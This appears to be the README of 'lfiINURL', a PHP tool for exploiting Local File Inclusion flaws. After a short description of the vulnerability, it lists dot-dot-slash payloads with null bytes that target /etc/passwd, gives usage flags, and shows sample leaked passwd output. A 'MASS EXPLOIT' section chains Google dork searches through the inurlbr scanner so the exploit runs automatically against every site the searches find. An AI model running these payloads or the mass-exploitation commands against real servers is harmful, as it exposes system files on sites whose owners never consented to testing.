# lfiINURL
------

```
  # AUTOR:        Cleiton Pinheiro / Nick: googleINURL
  # Blog:         http://blog.inurl.com.br
  # Twitter:      https://twitter.com/googleinurl
  # Fanpage:      https://fb.com/InurlBrasil
  # Pastebin      http://pastebin.com/u/Googleinurl
  # GIT:          https://github.com/googleinurl
  # PSS:          http://packetstormsecurity.com/user/googleinurl
  # YOUTUBE:      http://youtube.com/c/INURLBrasil
  # PLUS:         http://google.com/+INURLBrasil
```

-   Vulnerability Description
------
Local File Inclusion (also known as LFI) is the process of including files, that are already locally
present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application.
This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be 
included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash)
to be injected. Although most examples point to vulnerable PHP scripts,we should keep in mind that it is also common in other technologies such as JSP, ASP and others.

-   Tool Description
------
The script runs tests searching for the directory that contains the password file server / directory traversal
Exemple:
```
http://target.br/file.php?open=/etc/passwd%00
http://target.br/file.php?open=../etc/passwd%00
http://target.br/file.php?open=../../etc/passwd%00
http://target.br/file.php?open=../../../etc/passwd%00
http://target.br/file.php?open=../../../../etc/passwd%00
```

-   In successful cases
If the above mentioned conditions are met, an attacker would see something like the following:
```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
alex:x:500:500:alex:/home/alex:/bin/bash
margo:x:501:501::/home/margo:/bin/bash
```

-   COMMAND EXPLOIT --help
------
```
   -t : SET TARGET.
   -c : COUNT DIR.
        ex: -c   3 = /etc/passwd%00, ../etc/passwd%00, ../../etc/passwd%00 ...
   Execute:
                 php lfiINURL.php -t target.br/index.file?= -c 50
```

- Demonstration execution
------
![alt text](http://i.imgur.com/4apFMmZ.png "lfiINURL / INURL - BRASIL.")

- USE SCANNER INURLBR MASS EXPLOIT
COMMAND EXEMPLE:
```
inurlbr.php --dork 'br+index.p=' -s vull.txt -q all --comand-all 'URL="_TARGETFULL_&index.p=" && php lfiINURL.php -t $URL -c 10'

inurlbr.php --dork 'include=' -s vull.txt -q all --comand-all 'URL="_TARGETFULL_&include=" && php lfiINURL.php -t $URL -c 10'

inurlbr.php --dork 'cn+page=' -s vull.txt -q all --comand-all 'URL="_TARGETFULL_&page=" && php lfiINURL.php -t $URL -c 10'

inurlbr.php --dork 'cn+page=' -s vull.txt -q all --comand-all 'URL="_TARGETFULL_&page=" && php lfiINURL.php -t $URL -c 10'

#OBS USE UNIX
```

- Demonstration execution xpl + inurlbr
------
![alt text](http://i.imgur.com/7IZtM6J.jpg "lfiINURL + inurlbr / INURL - BRASIL. ")

- Download scanner inurlbr 1.0
------
https://github.com/googleinurl/SCANNER-INURLBR

- References
------
[1] https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion

[2] http://www.wikipedia.org/wiki/Local_File_Inclusion

[3] https://github.com/googleinurl/SCANNER-INURLBR#---definindo-comando-externo
